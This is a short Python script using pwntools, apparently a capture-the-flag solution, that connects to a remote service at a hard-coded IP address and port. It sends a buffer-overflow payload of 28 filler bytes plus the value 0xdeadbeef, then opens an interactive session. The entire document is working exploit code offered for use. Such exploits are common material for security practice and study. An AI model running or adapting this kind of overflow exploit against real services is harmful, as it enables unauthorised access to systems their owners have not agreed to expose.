from pwn import *
#r = process("./pass")
r = remote("120.114.62.211" ,6125)

payload = b"A"*28
payload+= p32(0xdeadbeef)


r.recvuntil(b"?")
r.sendline(payload)
r.interactive()
